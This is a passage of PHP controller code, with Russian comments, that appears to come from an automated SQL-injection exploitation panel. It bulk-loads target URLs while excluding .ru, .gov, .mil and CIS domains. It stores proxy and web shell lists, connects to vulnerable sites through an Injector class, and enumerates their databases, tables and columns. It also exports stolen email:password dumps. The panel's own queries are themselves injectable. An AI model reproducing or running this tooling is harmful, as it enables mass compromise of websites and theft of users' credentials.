			}
			
			
			
			
			$domen = $data['host'];
			
			
			if($data['query'] =='')
			{
				$this->d($value_orig.' - query pusto');
				exit;
			}
			
			if(!isset($data['host']))
			{
				$this->d($value_orig.' - host pusto');
				exit;
				
			}
			

			$data = $this->oneinfo($value,$domen);
			
			
		}
		
		
		$data2 = $this->Post->query("SELECT * FROM  `posts_one` WHERE `status` =3");
		
		
		$this->Post->query("UPDATE  `posts_one`  set `http` =  REPLACE(http,'http://','http')");
		$this->Post->query("UPDATE  `posts_one`  set `http` =  REPLACE(http,'https://','https')");
		$this->Post->query("UPDATE  `posts_one`  set `header` =  REPLACE(header,'http','get')");
		
		
		$p = array();
		
		$i = 1;
		
		foreach($data2 as $d)
		{
			
			$p[$i]['id'][] = 		$d['posts_one']['id'];
			$p[$i]['gurl'][] = 		$d['posts_one']['gurl'];
			$p[$i]['url'][] = 		$d['posts_one']['url'];
			$p[$i]['file_priv'][] = $d['posts_one']['file_priv'];
			$p[$i]['tic'][] = 		$d['posts_one']['tic'];
			$p[$i]['sposob'][] = 	$d['posts_one']['sposob'];
			$p[$i]['method'][] = 	$d['posts_one']['method'];
			$p[$i]['column'][] =  	$d['posts_one']['column'];
			$p[$i]['version'][] =   $d['posts_one']['version'];
			$p[$i]['work'][] =      $d['posts_one']['work'];
			$p[$i]['status'][] =    $d['posts_one']['status'];
			$p[$i]['domen'][] =     $d['posts_one']['domen'];
			$p[$i]['order'][] =     $d['posts_one']['order'];
			$p[$i]['sleep'][] =     $d['posts_one']['sleep'];
			$p[$i]['user'][] =      $d['posts_one']['user'];
			$p[$i]['find'][] =      $d['posts_one']['find'];
			$p[$i]['http'][] =      $d['posts_one']['http'];
			$p[$i]['header'][] =      $d['posts_one']['header'];
			
			$i++;
			
		}
		
		//$this->d($p,'p');
		
		$this->set('data',$p);

	}
	
	function add_one_domen(){//добавление домена на анализ
		
		
		
		
		if(isset($this->data))
		{ 
			
			if($this->data['Post']['domen'] !='')
			{
				
				$value = $this->data['Post']['domen'];
				$value = trim($value);
				
			}else{
				$this->d('dabavte link');
				exit;
			}
			
			
			
			

			$data = $this->crowler($value);
			
			
		}
		
		exit;
		$data2 = $this->Post->query("SELECT * FROM  `posts_one` WHERE `status` =3");
		
		
		$this->Post->query("UPDATE  `posts_one`  set `http` =  REPLACE(http,'http://','http')");
		$this->Post->query("UPDATE  `posts_one`  set `http` =  REPLACE(http,'https://','https')");
		$this->Post->query("UPDATE  `posts_one`  set `header` =  REPLACE(header,'http','get')");
		
		
		$p = array();
		
		$i = 1;
		
		foreach($data2 as $d)
		{
			
			$p[$i]['id'][] = 		$d['posts_one']['id'];
			$p[$i]['gurl'][] = 		$d['posts_one']['gurl'];
			$p[$i]['url'][] = 		$d['posts_one']['url'];
			$p[$i]['file_priv'][] = $d['posts_one']['file_priv'];
			$p[$i]['tic'][] = 		$d['posts_one']['tic'];
			$p[$i]['sposob'][] = 	$d['posts_one']['sposob'];
			$p[$i]['method'][] = 	$d['posts_one']['method'];
			$p[$i]['column'][] =  	$d['posts_one']['column'];
			$p[$i]['version'][] =   $d['posts_one']['version'];
			$p[$i]['work'][] =      $d['posts_one']['work'];
			$p[$i]['status'][] =    $d['posts_one']['status'];
			$p[$i]['domen'][] =     $d['posts_one']['domen'];
			$p[$i]['order'][] =     $d['posts_one']['order'];
			$p[$i]['sleep'][] =     $d['posts_one']['sleep'];
			$p[$i]['user'][] =      $d['posts_one']['user'];
			$p[$i]['find'][] =      $d['posts_one']['find'];
			$p[$i]['http'][] =      $d['posts_one']['http'];
			$p[$i]['header'][] =      $d['posts_one']['header'];
			
			$i++;
			
		}
		
		//$this->d($p,'p');
		
		$this->set('data',$p);

	}
	
	
	function add_domens(){//добавление линков в базу bota по одному линку на сайт с дублями по домену
		
		set_time_limit(0);  
		
		//echo 123;
		
		if(isset($this->data))
		{ 
			
			
			//$this->d($this->data);
			//exit;
			
			
			
			

			
			
			if($this->data['Post']['link'] !='')
			{
				$link = str_replace('http://','',$this->data['Post']['link']);
				$link = 'http://'.$link;
				
				$files = file($link);
				
			}else{
				$files = file($this->data['Post']['file']['tmp_name']);
			}
			
		
			
			$this->d(count($files),'VSEGO доменов');

			$files = array_unique($files); 
			
			shuffle($files); //мешаем
			
			
			
			foreach ($files as $value)
			{
				
				
				
				
				//echo $value;
				$value = str_replace('http://http://','http://',$value);
				$value = str_replace('https://http://','http://',$value);
				$value = str_replace('https://','',$value);
				$value = str_replace('http://','',$value);
				$value = str_replace('/','',$value);
				$value = str_replace('WWW.','www.',$value);
				$value = str_replace('www.','',$value);
				
				$value = strtolower($value);
				$value =  trim($value);
				
				$ext = explode(".",$value);
				
				//$this->d($ext,'ext');
				//exit;
				
				if(@$ext[1]==''){$k2++;continue;}	


				
				if(preg_match("/\.(ru|kz|az|am|by|ge|kg|kz|md|tj|tm|ua|uz|mil|gov|edu)+\//i",$value,$match)){
					
					$k3++;continue;
				}

				
				flush();
			
				$date = date('Y-m-d h:i:s');
			
				
				if($this->Post->query("INSERT INTO `domens` (`date`,`domen`) VALUES ('$date','$value')"))
				{
					//echo ' - Добавлен в обработку<br>';	
					$k++;
				}else
				{
					//d("INSERT INTO `domen` (`date`,`tic`,`domens`) VALUES ('$date',0,'$value')");
					$k2++;
				}
				
				
				
			}
			
			
			$this->d($k,'DABAVLENO V BASU');
			$this->d($k2,'NE DABAVLENO V BASU (DUBLI)');
			$this->d($k3,'Zaprechenie zony');
			
			
			//$this->redirect(array('action'=>'index'));
			
			
		}
		


	}
		
	function add_cron(){//добавление линков в базу bota по одному линку на сайт с дублями по домену через КРОН
		
		$this->timeStart = $this->start('add_cron_links',1);
		
		
		set_time_limit(0);  
		
		
		mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/addlinks", 0777);
		
		$ff = $_SERVER['DOCUMENT_ROOT']."/app/webroot/addlinks/";
		
		
		$dir = opendir ($ff); // открываем директорию
		$i = 0; // создаём переменную для цикла


		$lll = 0;

		//$this->d(readdir($dir));
		
		while (false !== ($file = readdir($dir))) 
		{

			//$this->d($dbpath.$file);
			// ниже указываем расширение файла. Вместо jpg выбираете нужный
			if (( $file != ".") && ($file != "..") && ($file != "Thumbs.db")) 
			{
				$files_all[$ff.$file] = file($ff.$file); 
				$i++;
				$this->d($ff.$file,$i);
				
			}
			
		}
		
		foreach($files_all as $key=>$files)
		{

			shuffle($files);
			
			
			$this->d(count($files),'VSEGO linkov '.$key);

			$i=0;
			
			$pusto = 0;
			
			
			foreach ($files as $value)
			{
				if($value =='')
				{
					$pusto++;
					continue;
				}
				
				$value = str_replace('http://http://','http://',$value);
				$value = str_replace('https://http://','http://',$value);
				$value = str_replace('https://','',$value);
				$value = str_replace('http://','',$value);
				$value  = str_replace('WWW.','www.',$value);
				$value = 'http://'.str_replace('%26', '&', $value);
				
				
				$value =  trim($value);
				$value2 = trim($value);
                
                
                
				if(preg_match("/\.(ru|kz|az|am|by|ge|kg|kz|md|tj|tm|ua|uz|mil|gov|edu)+\//i",$value,$match)){
					
					$k3++;
					$fileopen=fopen("links/zona_bad.tx","a+");
					fwrite($fileopen,$value."\r\n");
					fclose($fileopen);
					
					continue;
				}
                
                
                
				$data =   parse_url($value);
				
				//$this->d($data);
				
				if($data['query'] !='')
				{
					$path = $data['path'].'?';
				}else{
					$path = '';
				}
				
				$value = str_replace($this->Injector->engeen_addr, 'DICK!', $path.$data['query']);
				
				
				if(!strstr($value,'DICK!') AND strstr($value,'?'))
				{
					if($data['query'] == '')
					{
						//$this->d($value.' - query pusto');
						$pusto++;
						continue;
					}
					
					if(!isset($data['host']))
					{
						//$this->d($value2.' - host pusto');
						$pusto++;
						continue;
					}
					$new['http://'.$data['host'].''.$data['path'].''] = trim($value2);

				}else{
					//$this->d($value2.' - est slova zapreshenie, NE POIDUT ili netu ?');
					$pusto++;
					
				}	
			}
			
			
			$this->d($pusto,'V URL EST ZAPRESHENIE SLOVA ILI NETU ? ILI NETU .PHP '.$key);	
			
			$this->d(count($new),'LINKOV PRIGODNYH DLYA VSTAVKI V BD '.$key);	
			
			$lll = array();
			$k = 0;
			$k2 = 0;
			
			
			
			foreach ($new as $file)
			{
				
				
				$url = parse_url($file);
				flush();
				$domen = $url['host'];
				
				$file = str_replace('https://','',$file);
				$file = str_replace('http://','',$file);
				
				$this->data['Post']['id'] = 0;
				$this->data['Post']['url'] = $file;
				$this->data['Post']['date'] = date('Y-m-d h:i:s');
				$this->data['Post']['tic'] = 0;
				$this->data['Post']['maska'] = $this->get_arg_url($file);
				$this->data['Post']['domen'] = $domen;
				
				
				if($this->Post->save($this->data))
				{
					//echo $domen.' - OK<br>';
					$k++;
				}else
				{
					
					//echo $file.'  --  '.$domen." NO !!!!!!<br>";
					$k2++;
				}
				
			}
			
			unlink($key);
			
			
			$this->d($k,'DABAVLENO V BASU  '.$key);
			$this->d($k2,'NE DABAVLENO V BASU (DUBLI)  '.$key);
			
			$this->d('-----------------------------');
			
			
		}
		

		$this->stop();
	}
	
	function add_cron_N(){//добавление линков в базу bota по одному линку на сайт с дублями по домену через КРОН
		
		$this->timeStart = $this->start('add_cron_links_N',1);
		
		
		set_time_limit(0);  
		
		
		mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/addlinks", 0777);
		
		$ff = $_SERVER['DOCUMENT_ROOT']."/app/webroot/addlinks/";
		
		
		$dir = opendir ($ff); // открываем директорию
		$i = 0; // создаём переменную для цикла


		$lll = 0;

		//$this->d(readdir($dir));
		
		while (false !== ($file = readdir($dir))) 
		{

			//$this->d($dbpath.$file);
			// ниже указываем расширение файла. Вместо jpg выбираете нужный
			if (( $file != ".") && ($file != "..") && ($file != "Thumbs.db")) 
			{
				$files_all[$ff.$file] = file($ff.$file); 
				$i++;
				$this->d($ff.$file,$i);
				
			}
			
		}
		
		foreach($files_all as $key=>$files)
		{

			shuffle($files);
			
			
			$this->d(count($files),'VSEGO linkov '.$key);

			$i=0;
			
			$pusto = 0;
			
			
			foreach ($files as $value)
			{
				if($value =='')
				{
					$pusto++;
					continue;
				}
				
				$value = str_replace('http://http://','http://',$value);
				$value = str_replace('https://http://','http://',$value);
				$value = str_replace('https://','',$value);
				$value = str_replace('http://','',$value);
				$value  = str_replace('WWW.','www.',$value);
				$value = 'http://'.str_replace('%26', '&', $value);
				
				
				$value =  trim($value);
				$value2 = trim($value);
				$data =   parse_url($value);
				
				//$this->d($data);
				
				if($data['query'] !='')
				{
					$path = $data['path'].'?';
				}else{
					$path = '';
				}
				
				$value = str_replace($this->Injector->engeen_addr, 'DICK!', $path.$data['query']);
				
				
				if(!strstr($value,'DICK!') AND strstr($value,'?'))
				{
					if($data['query'] == '')
					{
						//$this->d($value.' - query pusto');
						$pusto++;
						continue;
					}
					
					if(!isset($data['host']))
					{
						//$this->d($value2.' - host pusto');
						$pusto++;
						continue;
					}
					$new['http://'.$data['host'].''.$data['path'].''] = trim($value2);

				}else{
					//$this->d($value2.' - est slova zapreshenie, NE POIDUT ili netu ?');
					$pusto++;
					
				}	
			}
			
			
			$this->d($pusto,'V URL EST ZAPRESHENIE SLOVA ILI NETU ? ILI NETU .PHP '.$key);	
			
			$this->d(count($new),'LINKOV PRIGODNYH DLYA VSTAVKI V BD '.$key);	
			
			$lll = array();
			$k = 0;
			$k2 = 0;
			
			
			
			foreach ($new as $file)
			{
				
				
				$url = parse_url($file);
				flush();
				$domen = $url['host'];
				
				$file = str_replace('https://','',$file);
				$file = str_replace('http://','',$file);
				
				$this->data['Post']['id'] = 0;
				$this->data['Post']['url'] = $file;
				$this->data['Post']['date'] = date('Y-m-d h:i:s');
				$this->data['Post']['tic'] = 0;
				$this->data['Post']['maska'] = $this->get_arg_url($file);
				$this->data['Post']['domen'] = $domen;
				
				
				if($this->Post->save($this->data))
				{
					//echo $domen.' - OK<br>';
					$k++;
				}else
				{
					
					//echo $file.'  --  '.$domen." NO !!!!!!<br>";
					$k2++;
				}
				
			}
			
			unlink($key);
			
			
			$this->d($k,'DABAVLENO V BASU  '.$key);
			$this->d($k2,'NE DABAVLENO V BASU (DUBLI)  '.$key);
			
			$this->d('-----------------------------');
			
			
		}
		

		$this->stop();
	}
	
	function add_proxy(){//добавление соксов
		
		
		
		if(isset($this->data))
		{    		 		
			
			$files = file($this->data['Post']['file']['tmp_name']);
			shuffle($files);
			
			if(file_put_contets('proxy.txt',$files)){
				
				echo 'good socks:'.count($files);
			}
			
			
			
			$this->redirect(array('action'=>'index'));
			
			
		}
		


	}
	
	function add_shells(){//добавление шелов
		
		
		
		if(isset($this->data))
		{    		 		
			
			$files = file($this->data['Post']['file']['tmp_name']);
			shuffle($files);
			
			if(file_put_contents('shelllist.txt',$files))
			{
				
				echo 'good shells uploads:'.count($files);
			}
			
			
			$this->redirect(array('action'=>'add_shells'));	
		}
		


	}
	
	function meiler(){//позволяет по одному домену скачивать из базы НЕ ИСПОЛЬЗУЕТСЯ
		
		if($this->params['form']['down'] !='' or $this->params['form']['down2'] !='' or $this->params['form']['onedomen'] !='')
		{
			
			$sdate  = $this->params['form']['sdate'];
			$podate = $this->params['form']['podate'];
			
			$domen = trim($this->params['form']['domen']);
			$zona = trim($this->params['form']['zona']);
			$type = $this->params['form']['type'];
			$site = $this->params['form']['site'];
			$z0 = '';
			
			//$this->d($type);
			
			//echo $type;
			if($domen !='')
			{
				
				//////// БЛОК с пассами без хешей///////////
				if($type == 'countNoHash')
				{
					
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%$domen%' AND pass !='0' AND hashtype ='0'");
					
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%$domen%' AND pass !='0' AND hashtype ='0'");
					
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countHash')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%$domen%'  AND pass !='0' AND hashtype !='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%$domen%' AND pass !='0' AND hashtype !='0'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countPass')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%$domen%'  AND pass !='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%$domen%' AND pass !='0'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countMail')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%$domen%'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%$domen%'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						
						if($d['mails']['pass'] !=0)
						{
							$z0 .= ":";
							$z0 .= $d['mails']['pass'];
						}
						
						$z0 .= "\r\n";

					}
					
				}
				
				//$this->d($data0);
				
				//$this->d($c0);
				
				$count = $c0[0][0]['count(*)'];
				//echo $count;
				
				$all = $domen.' count: '.$count;
				$str = $z0;
				

			}
			
			
			if($zona =="*")
			{
				
				//////// БЛОК с пассами без хешей///////////
				if($type == 'countNoHash')
				{
					
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype ='0'");
					
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype ='0'");
					
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countHash')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype !='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0' AND hashtype !='0'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countPass')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND pass !='0'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countMail')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate'");
					
					
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						
						if($d['mails']['pass'] !=0)
						{
							$z0 .= ":";
							$z0 .= $d['mails']['pass'];
						}
						
						$z0 .= "\r\n";

					}
					
				}
				
				//$this->d($data0);
				
				//$this->d($c0);
				
				$count = $c0[0][0]['count(*)'];
				//echo $count;
				
				$all = $type." s $sdate po $podate count: ".$count;
				$str = $z0;
				

			}
			
			
			if($zona !='' AND $zona !='*')
			{
				
				
				
				//////// БЛОК с пассами без хешей///////////
				
				if($type == 'countNoHash')
				{
					
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%.$zona%' AND pass !='0' AND hashtype ='0'");
					
					//$this->d("SELECT * FROM  `mails` WHERE meiler like '%$domen' AND pass !='0' AND hashtype ='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%.$zona%' AND pass !='0' AND hashtype ='0'");
					
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countHash')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%.$zona%'  AND pass !='0' AND hashtype !='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%.$zona%' AND pass !='0' AND hashtype !='0'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countPass')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%.$zona%'  AND pass !='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%.$zona%' AND pass !='0'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countMail')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%.$zona%'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND meiler like '%.$zona%'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						
						if($d['mails']['pass'] !=0)
						{
							$z0 .= ":";
							$z0 .= $d['mails']['pass'];
						}
						
						$z0 .= "\r\n";

					}
					
				}
				
				//$this->d($data0);
				
				//$this->d($c0);
				
				$count = $c0[0][0]['count(*)'];
				//echo $count;
				
				$all = $zona.' count: '.$count;
				$str = $z0;
				

				
				
			}
			
			if($site !='')
			{
				
				
				
				//////// БЛОК с пассами без хешей///////////
				
				if($type == 'countNoHash')
				{
					
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND domen = '$site' AND pass !='0' AND hashtype ='0'");
					
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND domen = '$site' AND pass !='0' AND hashtype ='0'");
					
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countHash')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND domen = '$site''  AND pass !='0' AND hashtype !='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND domen = '$site' AND pass !='0' AND hashtype !='0'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countPass')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND domen = '$site'  AND pass !='0'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND domen = '$site' AND pass !='0'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					
				}elseif($type == 'countMail')
				{
					$data0 = $this->Filed->query("SELECT * FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND domen = '$site'");
					
					$c0 = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE date >= '$sdate' AND date <= '$podate' AND domen = '$site'");
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						
						if($d['mails']['pass'] !=0)
						{
							$z0 .= ":";
							$z0 .= $d['mails']['pass'];
						}
						
						$z0 .= "\r\n";

					}
					
				}
				
				//$this->d($data0);
				
				//$this->d($c0);
				
				$count = $c0[0][0]['count(*)'];
				//echo $count;
				
				$all = $zona.' count: '.$count;
				$str = $z0;
				

				
				
			}
			
			header('Content-type: application/txt');
			header("Content-Disposition: attachment; filename='{$all}.txt'");
			echo "$z0";
			die();
			
			
		}

		$p['sdate'] = $this->Post->query("SELECT date FROM  `mails` group by date ");
		$p['podate'] = $this->Post->query("SELECT date FROM  `mails` group by date DESC");
		
		
		
		$p['domens'] = $this->Post->query("SELECT * FROM  `renders` order by countMail DESC");
		
		$this->set('data',$p);
	}
	
	
	////////////////////////
	
	function chengetable($bd,$table,$field){
		
		//die($table.'.'.$field);
		$tablea = $this->Session->read('table');
		//print_r($this->data);
		if($bd.'.'.$table!==$tablea){
			//echo '1';
			$this->Session->write('table',$bd.'.'.$table);
			$this->Session->write('field',$field);
			$this->Session->write('getwhere','');
			//$this->Session->read('getwhere')
			//echo 'pomeniali';
			
			$this->Session->write('tablecount','1221');
			
		}else{
			
			$fileds = $this->Session->read('field');
			
			if(!isset($this->data[$field])){

				$fileds = str_replace(','.$field, '', $fileds);
				$fileds = str_replace($field, '', $fileds);
				
			}else{
				$fileds .= ','.$field;
			}
			
			
			
			
			
			$fields = explode(',', $fileds);				
			
			$i=0;
			$new = '';
			foreach ($fields as $f){
				
				if(trim($f)!==''){
					
					
					
					if($i==0){

						
						$new = $f;
						
					}else{
						//echo '<br/>ololo:'.$f.'<br/>';
						$new = $new.','.$f;
						
					}
					$i++;
					
					//	echo ''.$f.'</br>';
				}
				
				
				
			}
			//echo '11:';
			//print_r($new);
			
			$this->Session->write('field',$new);
			
		}
		
		$this->gettable();
		$this->layout = FALSE;
		$this->render('gettable');
		
		//	$field = $this->Session->read('field');
		//	$field[] = $field;
		//	$this->Session->write('field',$field);

		//die('s');
	}
	
	function reconnect($id){// дочерняя функция от goadd
		
		$this->data = $this->Post->findbyid($id);
		
		$this->mysqlInj = new $this->Injector();
		$test = $this->mysqlInj->inject($this->data['Post']['header'].'::'.$this->data['Post']['url']);

		
		if($test==true){
			
			//echo '1';
			
			$this->data['Post']['method'] = $this->mysqlInj->method;
			$this->data['Post']['sposob'] = $this->mysqlInj->sposob;
			$this->data['Post']['column'] = $this->mysqlInj->column;
			$this->data['Post']['date']   = time();
			$this->data['Post']['status'] = 3;
			$this->data['Post']['version'] = $this->mysqlInj->version;
			
			$data = $this->mysqlInj->mysqlGetValue('mysql','user','file_priv');
			
			if($data['file_priv']!==false){

				$this->data['Post']['file_priv'] = 1;

			}

			//echo $this->data['Post']['version'] ;
			//die('1');
			if(is_array($this->mysqlInj->work) AND count($this->mysqlInj->work)>0){
				
				$work='';
				foreach ($this->mysqlInj->work as $w){
					
					$work.= $w.',';
					
				}
				$this->data['Post']['work'] = $work;
				
				
			}
			
			$this->Session->write('inject',$this->data);
			$this->Post->save($this->data);
			$this->Session->setFlash('Подключились!');
			
		}else{
			
			$this->Session->write('inject',$this->data);
			$this->Session->setFlash('Не смогли подключиться');

		}
		
		
		$this->redirect(array('action'=>'krutaten/'.$id));
		die();
	}
	
	function goadd(){ //как то связана с рекомнектом
		
		if (!empty($this->data)){
			$this->Session->write('urls','');
			uses('Sanitize');			
			
			$data = $this->Post->query("SELECT * FROM `posts` WHERE gurl='".Sanitize::escape($this->data['Post']['url'])."'");
			
			if($data==array()){
				
				$this->Post->save($this->data);
				$this->reconnect($this->Post->id);
				
			}else{
				//print_r($data);
				$this->reconnect($data[0]['posts']['id']);
				
			}
			
			//print_r($data);
		}
		
		
		//die();
	}
	
	function getTabl($bd,$data){ // НЕ ЯСНО
		
		//$data = $this->Session->read('inject');
		if(!isset($data['tables'])){
			
			$data = $this->getTables($bd);
			
		}
		
		foreach ($data['tables'][$bd] as $table){
			
			echo '<div style="padding-right:5px">';
			echo $table.'';
			//$this->getTables();
			'</div>';
			
		}
	}
	
	function getDataBd(){// НЕ ЯСНО
		
		$data = $this->Session->read('inject');
		
		foreach ($data['bds'] as $bd){
			
			echo '<div>';
			echo $bd.'';
			//	$this->getTabl($bd,$data);
			'</div>';

		}
		
	}
	
	function choisgetdata($param){ // НЕ ЯСНО
		
		//echo $param.'<br/>';
		//print_r($_POST);
		
		$val = $_POST;
		if(isset($_POST['data'])){
			$val = $_POST['data'];
		}
		$this->Session->write('get'.$param,$val[$param]);
		
		die();
	}
	
	function krutaten($id,$load=''){//функция вывода инфы при просмотре баз и таблиц
		
		$data = $this->Post->findbyid($id);
		


		if($load=='load'){

			$this->Session->write('inject',$data);
			$this->redirect(array('action'=>'krutaten/'.$id));

		}
		
		//print_r($data);
		
		
		
	}
	
	function color($id,$color=''){//функция вывода инфы при просмотре баз и таблиц
		
		

		$this->Post->query("UPDATE  `fileds` SET  `color` =  '".$color."' WHERE  `id` =".intval($id)." LIMIT 1 ;");
		
		//$this->d("UPDATE  `fileds` SET  `color` =  '".$color."' WHERE  `id` =".intval($id)." LIMIT 1 ;");
		
		//$this->d('<tr style="background-color:'.$color.'">');
		// id="data'.$value['Filed']['id'].'
		die();

		
		
		//print_r($data);
		
		
		
	}
	
	function colorOrders($id,$color=''){//функция вывода инфы при просмотре баз и таблиц
		
		

		$this->Post->query("UPDATE  `orders` SET  `color` =  '".$color."' WHERE  `id` =".intval($id)." LIMIT 1 ;");
		
		//$this->d("UPDATE  `fileds` SET  `color` =  '".$color."' WHERE  `id` =".intval($id)." LIMIT 1 ;");
		
		//$this->d('<tr style="background-color:'.$color.'">');
		// id="data'.$value['Filed']['id'].'
		die();

		
		
		//print_r($data);
		
		
		
	}
	
	function getbd(){//возвращает базы данных РАБОТАЕТ!
		
		$data = $this->Session->read('inject');

		$squle['Post'] = $data['Post'];
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
			//$this->d($set,'set');
		}else
		{
			$set = false;
		}
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		$data2['posts'] = $data['Post']; 

		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data2,$set);
		
		$bds = $this->mysqlInj->mysqlGetAllBd();
		
		$data['bds'] = $bds;
		$this->Session->write('inject',$data);

		$this->set('data',$data);		
		$this->render('data');
		
	}
	
	function getTables($bd){ //возвращает таблицы РАБОТАЕТ
		

		$data = $this->Session->read('inject');

		$squle['Post'] = $data['Post'];
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
			//$this->d($set,'set');
		}else
		{
			$set = false;
		}
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		$data2['posts'] = $data['Post']; 

		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data2,$set);
		
		$data2 = $this->mysqlInj->mysqlGetTablesByDd($bd);
		
		$data['tables'][$bd] = $data2;
		$this->Session->write('inject',$data);


		$this->set('data',$data);		
		$this->render('data');
		
		
	}
	
	function getField($bd,$table){ //возвращает колонки у таблицы РАБОТАЕТ
		

		$data = $this->Session->read('inject');
